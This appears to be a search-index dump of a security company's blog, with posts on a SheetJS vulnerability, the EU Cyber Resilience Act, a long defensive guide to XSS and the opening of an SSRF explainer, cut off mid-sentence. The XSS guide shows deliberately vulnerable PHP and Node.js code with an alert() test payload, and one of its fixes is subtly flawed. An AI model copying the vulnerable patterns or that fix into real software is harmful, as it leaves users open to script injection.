<li>Update the SheetJS version.</li> </ul> <p>The first option has drawbacks. Checking for exploit patterns via regex may inadvertently introduce a new ReDoS vulnerability, and addressing all problematic regex patterns in the application adds unnecessary complexity.</p> <p>The second option, while straightforward, is complicated by the fact that the package is no longer part of the npm ecosystem and must be imported manually.</p> <p>Given these considerations, our team at Atlansec chose the second option and updated SheetJS for this application.</p>","tags":["Cybersecurity","Dependency Management","Vulnerability Management","Development","NodeJS","Patching","Code Review"]},{"location":"blog/posts/19-01-2025/#conclusion","title":"Conclusion","text":"<p>Dependabot's alert on the SheetJS vulnerabilities served as a reminder of the complexity of dependency management. Addressing these issues required more than a simple one-click update. To make a good decision, we took a deep dive into the nature of the vulnerabilities, analysing their impact on our application and the practicality of the solutions available.</p> <p>By closely examining the vulnerabilities, Atlansec have developed on-premises mitigation strategies that meet the needs of our application. As with most projects, it's not just about fixing alerts, it's about understanding their implications and making decisions that balance both security and operational needs. For us, it was a reminder of how vigilance and adaptability can turn dependency challenges into opportunities to strengthen our application's security posture. And how important it is to build a security posture into both the development and maintenance of the application, not just from the perspective of an occasional vulnerability test.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Dependency Management","Vulnerability Management","Development","NodeJS","Patching","Code Review"]},{"location":"blog/posts/22-12-2024/","title":"New EU Cyber Resilience Act","text":"<p>On October 23, 2024, the European Cyber Resilience Regulation came into force, marking a regulatory shift aimed at strengthening digital security across the European Union. At Atlansec, this milestone reinforces our core mission: to create solutions and digital products that are secure throughout their lifecycle and ensure the protection of the environments in which they operate.</p>","tags":["Cybersecurity","European Union","Linux","Compliance"]},{"location":"blog/posts/22-12-2024/#what-does-this-regulation-entail","title":"What does this regulation entail?","text":"<p>The new regulatory framework establishes clear and unified requirements to ensure cybersecurity in the design, development, manufacturing, and commercialization of digital products. Its goal is to close existing security gaps and provide consumers and businesses with the confidence that the products they purchase are designed to be secure against current and future threats.</p>","tags":["Cybersecurity","European Union","Linux","Compliance"]},{"location":"blog/posts/22-12-2024/#key-objectives-of-the-regulation","title":"Key Objectives of the Regulation","text":"<ul> <li>Cybersecurity standards across Europe:   These apply to all connected products, whether directly or indirectly linked to networks or devices, avoiding overlaps between legislations in different Member States.</li> <li>Security throughout the lifecycle:   Manufacturers must implement vulnerability management processes, conduct risk assessments, and issue declarations of conformity.</li> <li>Greater transparency for consumers:   Facilitating the identification of secure products, helping users make informed decisions when purchasing hardware or software.</li> <li>Shared responsibility across the value chain:   Manufacturers, importers, and distributors must ensure compliance with these measures, enhancing security at every stage\u2014from design to end use.</li> </ul>","tags":["Cybersecurity","European Union","Linux","Compliance"]},{"location":"blog/posts/22-12-2024/#key-aspects-of-the-new-regulation","title":"Key Aspects of the New Regulation","text":"<ul> <li>Comprehensive coverage:   All digital products are subject to the regulation, except those already governed by other standards (e.g., medical devices, aircraft, and automobiles).</li> <li>Vulnerability management:   Manufacturers must ensure their digital products remain secure against new threats through timely updates.</li> <li>Market surveillance framework:   Strengthened oversight to ensure compliance with these standards and safeguard end users.</li> </ul> <p>At Atlansec, we firmly believe that cybersecurity must be the foundation of everything we do. Our commitment is to ensure that every solution, every line of code, and every product we develop is designed with security in mind\u2014not only in digital environments but also in the systems and structures that support them. This is how we build trust in an increasingly complex digital world.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","European Union","Linux","Compliance"]},{"location":"blog/posts/23-02-2025/","title":"Cross-Site Scripting: The Invisible Threat on Your Web","text":"<p>Cross-Site Scripting (XSS) vulnerabilities are a common and dangerous risk in web application security. They allow attackers to inject malicious JavaScript code into legitimate websites to steal information, manipulate page behavior, or impersonate users. This guide provides a detailed overview of the three main types of XSS: Stored XSS, Reflected XSS, and DOM-Based XSS, explaining how they occur, how they are exploited, and how to prevent them.</p> <p>In the context of web applications, XSS enables the injection of JavaScript code into legitimate sites. This can be leveraged to exfiltrate information from other users, manipulate page behavior, or perform actions within the application under the guise of a user's session. In desktop applications, such vulnerabilities can lead directly to arbitrary code execution on the victim's machine.</p> <p>This article delivers an in-depth examination of the three primary types of XSS attacks: Stored XSS, Reflected XSS, and DOM-Based XSS, detailing how they manifest, how they are exploited, and the measures that can be implemented to thwart them.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#what-is-it-used-for","title":"What is it Used For?","text":"<p>Cross-Site Scripting (XSS) attacks can be primarily utilized for:</p> <ul> <li>Session Cookie Theft: Allowing attackers to impersonate legitimate users and gain unauthorized access to their accounts.</li> <li>Identity Spoofing: Enabling attackers to perform unauthorized actions on behalf of the victim, such as altering passwords or executing fraudulent transactions.</li> <li>Phishing: Crafting deceptive pages or forms to dupe users into divulging their credentials.</li> <li>Defacement: Altering the appearance of websites to display malicious content or damage the organization's reputation.</li> <li>Keylogging: Recording keystrokes to steal passwords and other sensitive information.</li> <li>Browser Exploits: Taking advantage of vulnerabilities in the victim's browser to execute malicious code.</li> <li>Circumventing Access Controls: Bypassing security restrictions such as CSRF (Cross-Site Request Forgery) token validation.</li> </ul>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#how-are-they-exploited","title":"How are They Exploited?","text":"<p>Attackers typically adhere to the following steps to exploit XSS vulnerabilities:</p> <ol> <li>Vulnerability Identification: Scouring for entry points where JavaScript code can be injected, such as URL parameters or form fields.</li> <li>Payload Creation: Developing a malicious script designed to execute the desired action.</li> <li>Payload Injection: Inserting the malicious code into the web application, exploiting the absence of proper sanitization.</li> <li>Attack Delivery:<ul> <li>For Reflected XSS: Deceiving the victim into accessing a malicious link or submitting a manipulated form.</li> <li>For Stored XSS: The attack is triggered automatically when users access the compromised page.</li> </ul> </li> </ol>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#why-does-it-occur","title":"Why Does it Occur?","text":"<p>XSS vulnerabilities commonly arise due to:</p> <ul> <li>Inadequate Code Sanitization: Failing to properly validate user-supplied data or escape special HTML characters.</li> <li>Lack of Encoding: Not performing correct encoding when inserting data into different contexts (HTML, JavaScript, URL).</li> </ul> <p>This type of vulnerability isn't intrinsically linked to any specific programming language; however, for the sake of clarity in the examples, we will focus on PHP and JavaScript.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#stored-xss-the-time-bomb-in-your-database","title":"Stored XSS: The Time Bomb in Your Database","text":"<p>Stored XSS, also known as Persistent XSS, occurs when a web application stores attacker-supplied data (containing malicious code) in its database. This code is then inserted into web pages served to other users, affecting anyone who visits the compromised page. Forums, product reviews, and comment sections are the most frequent targets.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#vulnerable-php-code-and-solution","title":"Vulnerable PHP Code and Solution","text":"<p>In this instance, we observe that when a POST request (data submission) is made, the data input is not sanitized:</p> <p><pre><code>&lt;?php\n// Store user comments\n$comment = $_POST['comment'];\nmysqli_query($conn, \"INSERT INTO comments (comment) VALUES ('$comment')\");\n// Display comments\n$result = mysqli_query($conn, \"SELECT comment FROM comments\");\nwhile ($row = mysqli_fetch_assoc($result)) {\n  echo $row['comment'];\n}\n?&gt;\n</code></pre> The <code>$comment</code> variable stores the user input without prior sanitization, thereby presenting an opportunity for the attacker to introduce any payload.</p> <p>When the comments are displayed, the payload will be interpreted within the browser context of any victim who visits the website.</p> <p>A potential mitigation is as follows:</p> <pre><code>&lt;?php\n// Database connection (adjust credentials)\n$conn = new mysqli(\"localhost\", \"user\", \"password\", \"database\");\n\n// Check the connection\nif ($conn-&gt;connect_error) {\n  die(\"Connection error: \" . $conn-&gt;connect_error);\n}\n\n// Check if a comment has been submitted\nif ($_SERVER[\"REQUEST_METHOD\"] === \"POST\" &amp;&amp; isset($_POST['comment'])) {\n  // Trim whitespace from the beginning and end\n  $comment = trim($_POST['comment']); \n\n  // Prevent SQL Injection with prepared statements\n  $stmt = $conn-&gt;prepare(\"INSERT INTO comments (comment) VALUES (?)\");\n  $stmt-&gt;bind_param(\"s\", $comment);\n  $stmt-&gt;execute();\n  $stmt-&gt;close();\n}\n\n// Display comments securely\n$result = $conn-&gt;query(\"SELECT comment FROM comments\");\nwhile ($row = $result-&gt;fetch_assoc()) {\n  echo htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8') . \"\\n\\n\";\n}\n\n// Close the connection\n$conn-&gt;close();\n?&gt;\n</code></pre> <p>Data insertion has been protected through the use of Prepared Statements in PHP, and comment output via <code>htmlspecialchars</code>.</p> <ul> <li>Prepared Statements: Prevent SQL Injection by separating data from the SQL query, ensuring that user input is treated as a value and not as part of the SQL code.</li> <li><code>htmlspecialchars</code>: Ensures that all special characters are converted to their corresponding HTML entities, preventing XSS attacks.</li> </ul> <p>Danger</p> <p>We do not utilize <code>mysqli_real_escape_string</code> because it does NOT protect against SQL Injection on its own, as it depends on the <code>set_charset()</code> configuration. Consulting the official documentation reveals a warning that if the encoding is not set correctly, escaping special characters may not function as expected, potentially allowing injection attacks in some configurations.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#vulnerable-javascript-code-and-solution","title":"Vulnerable JavaScript Code and Solution","text":"<p>Numerous frameworks exist for implementing a backend with JavaScript, but the syntax remains similar across them.</p> <p>The following example in Node.js illustrates a Cross-Site Scripting (XSS) vulnerability in the generation of dynamic content:</p> <pre><code>app.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for (const comment of comments) {\n    html += `&lt;li&gt;${comment}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> <p>This code lists comments in the \"comments\" section of the application but does not escape special characters in the <code>${comment}</code> variable, thereby enabling the injection of HTML and the execution of arbitrary JavaScript code.</p> <p>To prevent XSS attacks, special characters must be sanitized before rendering the content on the frontend. Consequently, this code can be improved by sanitizing special characters using functions like <code>sanitizeHtml()</code>:</p> <pre><code>const sanitizeHtml = require('sanitize-html');\napp.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for(const comment of comments){\n    const sanitizedComment = sanitizeHtml(comment);\n    html += `&lt;li&gt;${sanitizedComment}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> <p>Warning</p> <p>Various libraries such as <code>DOMPurify</code>, <code>sanitize-html</code>, or <code>isomorphic-dompurify</code> can be employed to patch XSS vulnerabilities, contingent on whether you are working on the frontend or backend.</p> <ul> <li><code>DOMPurify</code>: Purifies HTML in frontend applications, eliminating malicious code.</li> <li><code>sanitize-html</code>: Ideal for the backend, sanitizes HTML by removing dangerous tags and attributes.</li> <li><code>isomorphic-dompurify</code>: A version of DOMPurify that functions both on the frontend and in the backend.</li> </ul> <p>In the preceding example, we utilized <code>sanitize-html</code> because we are operating in a Node.js environment.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#reflected-xss-the-opportunistic-attack","title":"Reflected XSS: The Opportunistic Attack","text":"<p>Having examined Stored XSS, Reflected XSS attacks occur solely on the client-side. These vulnerabilities often arise from the manipulation of URLs or forms. In these instances, the attacker must resort to social engineering techniques or vulnerability chaining to inject the payload into the victim's context.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#vulnerable-php-code-and-solution_1","title":"Vulnerable PHP Code and Solution","text":"<p>In this case, the vulnerability exists due to the failure to sanitize the query parameter before incorporating it into the HTML to be rendered:</p> <pre><code>&lt;?php\n$search_query = $_GET['query'];\necho \"&lt;p&gt;You searched for: $search_query&lt;/p&gt;\";\n?&gt;\n</code></pre> <p>If we have the following URL <code>http://url/search?query=search_result</code>, and we replace <code>search_result</code> with <code>&lt;script&gt;alert(\"Hello\");&lt;/script&gt;</code>, the injected script will be reflected in the page since HTML entities are not being sanitized. The solution could again involve the use of <code>htmlspecialchars</code>.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#vulnerable-javascript-code-and-solution_1","title":"Vulnerable JavaScript Code and Solution","text":"<p>As with Stored XSS, we will use an example of a web application implemented with the Node.js framework.</p> <p>This application contains the following code snippet:</p> <pre><code>const express = require('express');\nconst app = express();\n\napp.get('/search', function(req, res){\n  var searchTerm = req.query.query;\n  res.send('You searched for: ' + searchTerm);\n});\n\napp.listen(80);\n</code></pre> <p>We observe that the content of the <code>query</code> variable, which appears in the URL <code>http://url/search?query=search_result</code>, is obtained. This data input lacks any sanitization, leading to a Reflected XSS vulnerability. As with the case of Stored XSS, this can be resolved with libraries such as <code>sanitize-html</code> or <code>DomPurify</code>.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#dom-based-xss-the-invisible-danger-on-the-client","title":"DOM-Based XSS: The Invisible Danger on the Client","text":"<p>DOM-Based XSS is a web security vulnerability that occurs on the client-side, without requiring the server to reflect the attack payload directly in the response. It is exploited by manipulating the Document Object Model (DOM) in the user's browser.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#what-is-the-dom","title":"What is the DOM?","text":"<p>The DOM (Document Object Model) is a programming interface that represents a web document as a tree structure. It allows scripts, such as JavaScript, to dynamically access and modify the content, structure, and style of a web document.</p> <p>The structure of the DOM is composed of:</p> <ul> <li>HTML elements (nodes)</li> <li>Attributes of elements</li> <li>Text within elements</li> <li>Comments</li> </ul> DOM Structure","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#methodology-of-dom-based-xss-attacks","title":"Methodology of DOM-Based XSS Attacks","text":"<p>The attacker injects a malicious script that executes in the client's browser by manipulating the DOM. The general process is:</p> <ol> <li>Vulnerability Identification: The attacker finds a point in the client-side JavaScript code where data controlled by the attacker (e.g., URL parameters) are used to modify the DOM in an insecure manner. This involves identifying both the source of the data (where attacker-controlled data enters) and the sink (where the data is used dangerously to manipulate the DOM).</li> <li>Creation of the Malicious URL: A URL is created containing malicious JavaScript code, typically as part of a parameter or URL fragment. The payload is placed in a data source controllable by the attacker.</li> <li>Victim Deception: The victim is tricked into accessing the malicious URL through phishing, shortened links, etc.</li> <li>Execution in the Browser: The victim's browser loads the page and executes the legitimate JavaScript code of the application.</li> <li>DOM Manipulation: The legitimate code, using data from the malicious URL, modifies the DOM, inserting the malicious script. The key is that the sink receives contaminated data from the source and uses it to modify the DOM insecurely.</li> <li>Execution of the Malicious Script: The injected script executes in the context of the web page, allowing the attacker to perform actions such as stealing cookies, manipulating the page, redirects, or even exfiltrating sensitive data.</li> </ol>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#common-sources-of-dom-xss","title":"Common Sources of DOM XSS","text":"<p>The most common data sources include:</p> <ol> <li> <p><code>window.location</code>: This object contains information about the current URL of the document. It is very useful for obtaining different parts of the URL.</p> <ul> <li><code>window.location.hash</code>: Returns the fragment of the URL (the part after the <code>#</code>), which is often used for single-page navigation.</li> <li><code>window.location.search</code>: Returns the query string of the URL (the part after the <code>?</code>), which contains parameters that can be used by the server or the client.</li> <li><code>window.location.pathname</code>: Returns the path of the URL (the part after the domain), which indicates the location of the resource on the server.</li> <li><code>document.referrer</code>: This attribute returns the URL of the page from which the user arrived at the current page. It is useful for tracking where visitors come from.</li> <li><code>document.URL</code>: Returns the complete URL of the current page. It is similar to <code>window.location.href</code> and can be used to obtain the complete URL in a single call.</li> <li>Cookies: Cookies are small pieces of data stored in the user's browser. They are used to remember information between sessions, such as authentication data, user preferences, and more. In JavaScript, they can be accessed and manipulated using <code>document.cookie</code>.</li> </ul> </li> </ol> <p>These data sources are common in web development and are used to obtain information about user navigation and application state.</p> <p>Reminder</p> <p>These sources are controllable by the attacker in some way.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#common-sinks-of-dom-xss","title":"Common Sinks of DOM XSS","text":"<p>Sinks are potentially dangerous functions or DOM objects in JavaScript that can cause unwanted effects if passed data controlled by an attacker.</p> <p>According to PortSwigger, some of the most common sinks that lead to DOM XSS include:</p> <ul> <li><code>document.write()</code>: Writes HTML text directly into the document. Primarily used during page loading.</li> <li><code>document.writeln()</code>: Similar to <code>document.write()</code>, but appends a newline after the text.</li> <li><code>document.domain</code>: A property that returns or sets the domain.</li> </ul>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#methodology-of-dom-based-xss-attacks_1","title":"Methodology of DOM-Based XSS Attacks","text":"<p>The attacker injects a malicious script that executes in the client's browser by manipulating the DOM. The general process is:</p> <ol> <li>Vulnerability Identification: The attacker finds a point in the client-side JavaScript code where data controlled by the attacker (e.g., URL parameters) are used to modify the DOM in an insecure manner. This involves identifying both the source of the data (where attacker-controlled data enters) and the sink (where the data is used dangerously to manipulate the DOM).</li> <li>Creation of the Malicious URL: A URL is created containing malicious JavaScript code, typically as part of a parameter or URL fragment. The payload is placed in a data source controllable by the attacker.</li> <li>Victim Deception: The victim is tricked into accessing the malicious URL through phishing, shortened links, etc.</li> <li>Execution in the Browser: The victim's browser loads the page and executes the legitimate JavaScript code of the application.</li> <li>DOM Manipulation: The legitimate code, using data from the malicious URL, modifies the DOM, inserting the malicious script. The key is that the sink receives contaminated data from the source and uses it to modify the DOM insecurely.</li> <li>Execution of the Malicious Script: The injected script executes in the context of the web page, allowing the attacker to perform actions such as stealing cookies, manipulating the page, redirects, or even exfiltrating sensitive data.</li> </ol>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#common-sources-of-dom-xss_1","title":"Common Sources of DOM XSS","text":"<p>The most common data sources include:</p> <ol> <li> <p><code>window.location</code>: This object contains information about the current URL of the document. It is very useful for obtaining different parts of the URL.</p> <ul> <li><code>window.location.hash</code>: Returns the fragment of the URL (the part after the <code>#</code>), which is often used for single-page navigation.</li> <li><code>window.location.search</code>: Returns the query string of the URL (the part after the <code>?</code>), which contains parameters that can be used by the server or the client.</li> <li><code>window.location.pathname</code>: Returns the path of the URL (the part after the domain), which indicates the location of the resource on the server.</li> <li><code>document.referrer</code>: This attribute returns the URL of the page from which the user arrived at the current page. It is useful for tracking where visitors come from.</li> <li><code>document.URL</code>: Returns the complete URL of the current page. It is similar to <code>window.location.href</code> and can be used to obtain the complete URL in a single call.</li> <li>Cookies: Cookies are small pieces of data stored in the user's browser. They are used to remember information between sessions, such as authentication data, user preferences, and more. In JavaScript, they can be accessed and manipulated using <code>document.cookie</code>.</li> </ul> </li> </ol> <p>These data sources are common in web development and are used to obtain information about user navigation and application state.</p> <p>Reminder</p> <p>These sources are controllable by the attacker in some way.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#sinks-comunes-de-dom-xss","title":"Sinks Comunes de DOM XSS","text":"<p>Sinks are potentially dangerous functions or DOM objects in JavaScript that can cause unwanted effects if passed data controlled by an attacker. According to PortSwigger, some of the most common sinks that lead to DOM XSS include:</p> <ul> <li><code>document.write()</code>: Writes HTML text directly into the document. Primarily used during page loading.</li> <li><code>document.writeln()</code>: Similar to <code>document.write()</code>, but appends a newline after the text.</li> <li><code>document.domain</code>: A property that returns or sets the domain of the current page.</li> <li><code>element.innerHTML</code>: Property that sets or returns the HTML content of an element.</li> <li><code>element.outerHTML</code>: Property that sets or returns the complete HTML of the element, including the element itself.</li> <li><code>element.insertAdjacentHTML()</code>: Method that inserts a text HTML at a specific position relative to the element.</li> <li><code>element.onevent</code>: (e.g., <code>onclick</code>, <code>onload</code>): Properties that assign functions to specific events of the element.</li> <li><code>eval()</code>: Function that evaluates JavaScript code represented as a text string.</li> </ul> <p>Also, certain jQuery functions can be problematic:</p> <ul> <li><code>add()</code>, <code>after()</code>, <code>append()</code>, <code>animate()</code>, <code>before()</code>, <code>html()</code>, <code>prepend()</code>, <code>replaceAll()</code>, <code>replaceWith()</code>, <code>wrap()</code>, <code>wrapInner()</code>, <code>wrapAll()</code>.</li> <li><code>attr()</code> (if used with unsanitized data)</li> <li><code>$()</code> (selector, especially with location.hash)</li> </ul> <p>Reminder</p> <p>It is crucial to bear in mind that it is not sufficient for a source and a sink to be present in the code. There must be an executable data flow from the source to the sink for the vulnerability to be exploitable.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#vulnerable-code-and-solution","title":"Vulnerable Code and Solution","text":"<p>We have the following web page:</p> Initial Website <p>At first glance, we don't see anything relevant, but if we inspect the source code of it, we see the following:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n     &lt;title&gt;Web Vulnerable&lt;/title&gt;\n     &lt;/head&gt; \n  &lt;body&gt;\n    &lt;div id=\"saludo\"&gt;&lt;/div&gt;\n    ```javascript\n    &lt;script&gt; \n      // Get the 'nombre' parameter from the URL\n      const nombre = new URLSearchParams(window.location.search).get('nombre');\n      if(nombre == null){\n        document.write(\"Hola, \u00bfC\u00f3mo te llamas?\");\n      }else{\n        // Display the results in an unsanitized manner\n        document.write(\"Hola \" + nombre + \", \u00bfQu\u00e9 tal?\");\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Here, <code>window.location.search</code> is the source, and <code>document.write()</code> is the sink.</p> <p>As we can see, the web page is making use of the function <code>document.write()</code>, which inserts a parameter <code>nombre</code> without previous validation or sanitization. Thus, since by default that parameter is null, we see that the web shows us what is contained in the <code>if</code> statement; however, if we pass a name as a parameter in the URL, we have:</p> Web URL modificada <p>As a result, we have that the name introduced as a parameter to the URL is reflected on the web page. Since the input of the username is not sanitized, we can try to inject JavaScript code to check if the web is susceptible to XSS; Spoiler: It is.</p> Website vulnerable to DOM-Based XSS <p>As we see, the script was executed and showed the alert, since it is susceptible to XSS; therefore, a way to be able to remedy this vulnerability would be:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Web Vulnerable&lt;/title&gt;\n    &lt;/head&gt; \n    &lt;body&gt;\n      &lt;div id=\"saludo\"&gt;&lt;/div&gt;\n      &lt;script&gt; \n     // Get the 'nombre' parameter from the URL\n     const nombre = encodeURIComponent(new URLSearchParams(window.location.search).get('nombre'));\n     if(nombre == null){\n       document.write(\"Hello, what's your name?\");\n     }else{\n       // Display the results in a sanitized manner\n       document.write(\"Hello \" + nombre + \", how are you?\");\n     }\n      &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>If now we inject malicious JavaScript code again, we will have the following result:</p> DOM-Based XSS vulnerability solved <p>As we see, if we make use of the method <code>encodeURIComponent</code>, which performs a sanitization of the special characters that the query parameter may have, and we also insert this content via <code>textContent</code>.</p> <p>It should also be noted that we can make use of DOMPurify to sanitize dynamic content in web applications. DOMPurify is a JavaScript library that purifies HTML and removes any malicious code, providing an additional layer of security against XSS attacks. It is especially useful in frontend applications where the DOM is manipulated directly.</p> <pre><code>const DOMPurify = require('dompurify');\napp.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for(const comment of comments){\n    const sanitizedComment = DOMPurify.sanitize(comment);\n    html += `&lt;li&gt;${sanitizedComment}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> <p>In this example, we use DOMPurify to clean the comments before inserting them into the DOM, ensuring that any potentially dangerous content is neutralized.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#conclusion","title":"Conclusion","text":"<p>XSS vulnerabilities are a serious risk for the security of web applications. However, by implementing the prevention measures described in this article, it is possible to protect web applications against XSS attacks. In a future post, we will delve into the particularities and consequences of XSS vulnerabilities in mobile and desktop applications, where the impact of a successful exploitation can be even greater.</p> <p>In summary, the keys to prevent XSS are:</p> <ul> <li>Validate and sanitize user input data.</li> <li>Escape output data in the appropriate context.</li> <li>Perform periodic security audits.</li> <li>Train developers in web security best practices.</li> </ul> <p>In a future post, we will delve into the particularities and consequences of XSS vulnerabilities in mobile and desktop applications, where the impact of a successful exploitation can be even greater.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-02-2025/#additional-resources","title":"Additional Resources","text":"<ul> <li>OWASP Cross-Site Scripting (XSS)</li> <li>PortSwigger Web Security Academy</li> </ul> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","XSS","JavaScript","Web Security","Vulnerabilities","Secure Development","Code Injection"]},{"location":"blog/posts/23-03-2025/","title":"Server-Side Request Forgery: The Backdoor That Can Take Down Your Infrastructure","text":"<p>In the realm of web security, Server-Side Request Forgery (SSRF) vulnerabilities stand out as one of the most critical and underestimated threats. They allow attackers to manipulate servers to make unauthorized HTTP requests to internal systems, compromising everything from APIs and cloud services to infrastructures protected by firewalls.</p> <p>This attack technique, often overlooked, can turn a seemingly secure server into an entry point for cybercriminals, enabling them to access internal resources, steal sensitive data, and even launch attacks against third parties.</p> <p>The result? Data theft, access to internal services, remote code execution, and ultimately, reputational damage, regulatory fines for non-compliance with laws like GDPR, and significant financial losses. A successful SSRF attack can cripple critical operations and erode customer trust.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#what-is-an-ssrf-vulnerability","title":"What is an SSRF Vulnerability?","text":"<p>Server-Side Request Forgery (SSRF) vulnerabilities occur when an attacker can manipulate a server into making unauthorized requests. Imagine a web server acting as a messenger that normally delivers messages (requests) only to authorized recipients. Exploiting an SSRF attack would be equivalent to a stranger forcing the messenger to send letters to any recipient without filtering, bypassing customs, and using an official sender.</p> <p>To see a more concrete case, consider a shopping application that checks product stock through requests to a REST API. The application passes the URL to the API endpoint via an HTTP request. An attacker who notices this could modify this URL to access other internal API endpoints, potentially retrieving unauthorized information such as other users' data.</p> <p>Additionally, SSRF attacks are not limited to the HTTP protocol. In some cases, an attacker could attempt to use other URI schemes, such as <code>file://</code> to access local files on the server, <code>smb://</code> to force authentication and obtain an NTLM hash, or other diverse protocols.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#impact-of-ssrf-attacks","title":"Impact of SSRF Attacks","text":"<p>Generally, an SSRF attack can result in unauthorized access to internal resources. In some situations, the SSRF vulnerability could allow an attacker to execute arbitrary commands through a chain of vulnerabilities.</p> <p>When an SSRF can be used to establish connections with third-party external systems, an attacker can leverage it for spoofing attacks. This means that attacks will appear to originate from the organization hosting the vulnerable application. For example, an attacker could use an SSRF-vulnerable server to scan ports on another company\u2019s internal network or even launch a denial-of-service (DoS) attack against an external service, making it seem like the offensive originates from the compromised organization.</p> <p>Another possible exploitation scenario is internal network (intranet) reconnaissance, where an attacker can leverage SSRF to send requests to internal addresses through the affected server. This would allow them to identify open ports, map internal services, and gather sensitive information about the network infrastructure. The severity of the attack increases if the compromised server has privileged access to internal resources that would normally be protected from external access.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#types-of-server-side-request-forgery","title":"Types of Server-Side Request Forgery","text":"<p>There are two main types of Server-Side Request Forgery (SSRF) attacks:</p> <ul> <li>Standard SSRF: In this type of attack, the server's response is directly shown to the attacker. The server fetches the attacker-supplied URL and sends the content (or part of it) back in the response.</li> <li>Blind SSRF: In this case, the response is not sent back to the attacker. The attacker must devise ways to confirm and exploit the vulnerability without seeing the server\u2019s response directly.</li> </ul> <p>Next, we will examine the characteristics and exploitation methods of each type of SSRF, along with possible approaches for detecting and mitigating these vulnerabilities.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#standard-ssrf","title":"Standard SSRF","text":"<p>The standard SSRF attack is the most direct form of this attack. In this scenario, the attacker can directly observe the server's response to the manipulated request, allowing them to collect detailed information about the internal network, identify accessible services, and retrieve potentially sensitive data.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#exploitation-methodology","title":"Exploitation Methodology","text":"<p>Exploiting this type of SSRF follows three phases:</p> <ol> <li>Injection: The attacker injects a malicious URL into an application input field.</li> <li>Request: The server, without validating the URL, makes a request to the resource specified by the attacker.</li> <li>Disclosure: The server\u2019s response is returned to the attacker, allowing them to access internal information.</li> </ol> <p>In the following example, we have a web application that allows querying the stock of the products it offers. To better visualize the requests, we will use an application proxy like 